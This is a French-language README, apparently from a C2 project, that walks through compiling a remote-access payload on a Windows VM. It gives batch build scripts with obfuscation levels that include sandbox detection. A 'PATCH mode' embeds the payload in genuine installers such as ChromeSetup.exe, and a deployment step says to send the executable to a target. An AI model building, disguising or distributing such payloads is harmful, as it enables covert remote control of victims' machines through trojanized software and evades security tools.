# 🖥️ Setup VM Windows - Guide Ultra-Simple

## 🎯 Objectif

Compiler le payload (avec ou sans mode PATCH) directement sur ta VM Windows.

**Temps estimé** : 10-15 minutes

---

## 📋 Prérequis

- ✅ VM Windows (Windows 10 ou 11)
- ✅ Connexion Internet
- ✅ ~500 MB d'espace disque

---

## 🚀 Installation (Une seule fois)

### Étape 1: Installer Python

1. **Ouvre un navigateur dans ta VM Windows**
2. Va sur : https://www.python.org/downloads/
3. Clique sur **"Download Python 3.11.x"**
4. Lance l'installeur
5. ⚠️ **IMPORTANT** : Coche **"Add Python to PATH"**
6. Clique "Install Now"

### Étape 2: Vérifier Python

Ouvre **PowerShell** (ou CMD) :
```powershell
python --version
# Doit afficher : Python 3.11.x
```

### Étape 3: Installer PyInstaller

```powershell
pip install pyinstaller
```

Attends 1-2 minutes... Terminé ! ✅

---

## 📁 Transférer le Code

### Option A: Clone depuis GitHub (Recommandé)

Dans PowerShell :
```powershell
# Installer Git si pas déjà installé
winget install Git.Git

# Clone le repo
cd Desktop
git clone https://github.com/kalilBelgoumri/pupy-c2-manager-macos.git
cd pupy-c2-manager-macos
```

### Option B: Partage de fichiers VM

1. **Sur macOS** : Copie le dossier `pupy-c2-manager-macos`
2. **Dans la VM** : Colle sur le Bureau
3. **Ou utilise** : Drag & Drop si supporté par ta VM

### Option C: Fichier ZIP

```powershell
# Sur macOS
cd /Users/kalilbelgoumri/Desktop
zip -r pupy-c2-manager-macos.zip pupy-c2-manager-macos

# Transfère le .zip dans la VM
# Puis extrais dans Windows
```

---

## 🔨 Compilation Simple (Payload Standalone)

### Méthode 1: Script Automatique

Crée un fichier `build_windows_local.bat` :

```batch
@echo off
echo ========================================
echo  C2 Payload Builder - Windows
echo ========================================
echo.

:: Demander IP
set /p LISTENER_IP="Enter Listener IP (ex: 192.168.1.40): "

:: Demander Port
set /p LISTENER_PORT="Enter Listener Port (default 4444): "
if "%LISTENER_PORT%"=="" set LISTENER_PORT=4444

:: Demander Obfuscation
echo.
echo Obfuscation Levels:
echo   1 - Base64
echo   2 - XOR + Delays (RECOMMENDED)
echo   3 - Sandbox Detection
echo   4 - Dynamic Imports
echo   5 - Maximum
echo.
set /p OBF_LEVEL="Choose level (1-5, default 2): "
if "%OBF_LEVEL%"=="" set OBF_LEVEL=2

echo.
echo Building payload...
echo IP: %LISTENER_IP%
echo Port: %LISTENER_PORT%
echo Obfuscation: Level %OBF_LEVEL%
echo.

:: Build
python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('%LISTENER_IP%', %LISTENER_PORT%, %OBF_LEVEL%, 'windows')"

echo.
echo ========================================
echo  Build Complete!
echo  Output: dist\c2_payload.exe
echo ========================================
pause
```

**Utilisation** :
```powershell
cd pupy-c2-manager-macos
.\build_windows_local.bat
```

### Méthode 2: Commande Directe

```powershell
cd pupy-c2-manager-macos

python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('192.168.1.40', 4444, 2, 'windows')"
```

**Résultat** :
```
dist\c2_payload.exe  (~7-8 MB)
```

---

## 🎭 Compilation avec Mode PATCH

### Étape 1: Télécharger l'App Légitime

Dans la VM Windows, télécharge un vrai installateur :
- **Chrome** : https://www.google.com/chrome/
- **Discord** : https://discord.com/download  
- **Zoom** : https://zoom.us/download

Sauvegarde-le sur le Bureau : `C:\Users\TON_USER\Desktop\ChromeSetup.exe`

### Étape 2: Script Build avec PATCH

Crée `build_patch.bat` :

```batch
@echo off
echo ========================================
echo  C2 Patch Mode Builder - Windows
echo ========================================
echo.

:: Demander le fichier à patcher
set /p PATCH_FILE="Enter path to .exe to patch (ex: C:\Users\User\Desktop\ChromeSetup.exe): "

:: Vérifier que le fichier existe
if not exist "%PATCH_FILE%" (
    echo ERROR: File not found!
    pause
    exit /b 1
)

:: Demander IP
set /p LISTENER_IP="Enter Listener IP (ex: 192.168.1.40): "

:: Demander Port
set /p LISTENER_PORT="Enter Listener Port (default 4444): "
if "%LISTENER_PORT%"=="" set LISTENER_PORT=4444

:: Obfuscation fixe à 2 pour tests
set OBF_LEVEL=2

echo.
echo Building PATCHED payload...
echo Target file: %PATCH_FILE%
echo IP: %LISTENER_IP%
echo Port: %LISTENER_PORT%
echo Obfuscation: Level %OBF_LEVEL%
echo.

:: Build avec patch
python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('%LISTENER_IP%', %LISTENER_PORT%, %OBF_LEVEL%, 'windows', r'%PATCH_FILE%')"

echo.
echo ========================================
echo  Build Complete!
echo  Output: dist\ChromeSetup.exe (patched)
echo ========================================
pause
```

**Utilisation** :
```powershell
cd pupy-c2-manager-macos
.\build_patch.bat
```

---

## 🧪 Test Local dans la VM

### Test 1: Vérifier que le payload se compile

```powershell
cd pupy-c2-manager-macos
python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('192.168.1.40', 4444, 2, 'windows')"

# Vérifier le fichier
dir dist\c2_payload.exe
# Doit afficher : ~7-8 MB
```

### Test 2: Lancer le listener sur macOS

Sur ton Mac :
```bash
python3 src/main.py
# → Clients → Start Listener
# Status: 🟢 Listening on 192.168.1.40:4444
```

### Test 3: Exécuter le payload dans la VM

Dans la VM Windows :
```powershell
cd pupy-c2-manager-macos\dist
.\c2_payload.exe
```

**Attends 5-10 secondes** et vérifie ton Mac → Clients → La victime devrait apparaître ! 🎉

---

## 🔧 Configuration Réseau VM

### Pour que ça fonctionne entre ton Mac et la VM :

#### Option 1: Mode Bridge (Recommandé)

1. **VirtualBox** : Settings → Network → Adapter 1 → **Bridged Adapter**
2. **VMware** : Settings → Network → **Bridged Networking**
3. La VM aura sa propre IP (ex: 192.168.1.50)

#### Option 2: Mode NAT avec Port Forwarding

1. **VirtualBox** : Settings → Network → Adapter 1 → NAT → Port Forwarding
2. Ajoute une règle :
   - Name: `C2`
   - Protocol: `TCP`
   - Host IP: `127.0.0.1`
   - Host Port: `4444`
   - Guest IP: (vide)
   - Guest Port: `4444`

3. Dans le payload, utilise `127.0.0.1` comme IP

#### Option 3: Réseau Hôte uniquement

1. **VirtualBox** : Settings → Network → Adapter 1 → **Host-only Adapter**
2. La VM et le Mac seront sur le même réseau privé

---

## 📊 Récapitulatif des Commandes

### Build Simple (Standalone)
```powershell
python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('192.168.1.40', 4444, 2, 'windows')"
```

### Build avec PATCH
```powershell
python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('192.168.1.40', 4444, 2, 'windows', r'C:\Users\User\Desktop\ChromeSetup.exe')"
```

### Vérifier le fichier
```powershell
dir dist\c2_payload.exe
dir dist\ChromeSetup.exe
```

### Test de connexion
```powershell
# Tester si le Mac est accessible depuis la VM
ping 192.168.1.40

# Tester si le port est ouvert
Test-NetConnection -ComputerName 192.168.1.40 -Port 4444
```

---

## ⚠️ Troubleshooting

### Problème : "python not found"
```powershell
# Réinstalle Python et coche "Add Python to PATH"
# Ou ajoute manuellement au PATH :
setx PATH "%PATH%;C:\Users\TON_USER\AppData\Local\Programs\Python\Python311"
```

### Problème : "No module named 'PyInstaller'"
```powershell
pip install pyinstaller
```

### Problème : "Connection refused" dans le payload
```powershell
# Vérifie que le listener tourne sur le Mac
# Vérifie l'IP (doit être l'IP du Mac, pas 0.0.0.0)
# Vérifie le firewall du Mac (désactive temporairement)
```

### Problème : VM n'a pas Internet
```powershell
# Change le réseau VM en "NAT" temporairement
# Installe Python + PyInstaller
# Puis repasse en "Bridge" pour tester
```

---

## 🎯 Workflow Complet

### 1. Setup (Une fois)
```
VM Windows → Installer Python → pip install pyinstaller
```

### 2. Code
```
Mac → Modifie le code → git push
VM Windows → git pull
```

### 3. Build
```
VM Windows → build_windows_local.bat
```

### 4. Test
```
Mac → Start Listener
VM Windows → Exécute c2_payload.exe
Mac → Voir la victime apparaître
```

### 5. Déploiement
```
VM Windows → Copie dist\c2_payload.exe
→ Transfère sur une vraie machine Windows
→ Ou envoie à la cible
```

---

## 💡 Avantages de la VM Windows

| Avantage | Explication |
|----------|-------------|
| ✅ Vrais .exe Windows | PyInstaller compile des vrais PE x64 |
| ✅ Test sûr | Pas de risque pour ta machine principale |
| ✅ Mode PATCH fonctionnel | Peut patcher ChromeSetup.exe |
| ✅ Debug facile | Console visible, logs accessibles |
| ✅ Snapshots | Retour arrière si problème |

---

## 🚀 C'est Tout !

**En résumé** :
1. VM Windows → Installe Python + PyInstaller (10 min)
2. Clone/Copie le code
3. Lance `build_windows_local.bat`
4. Récupère `dist\c2_payload.exe`
5. Profit ! 🎉

Pas compliqué du tout, en fait c'est **plus simple** que GitHub Actions car tu as le contrôle total ! 💪
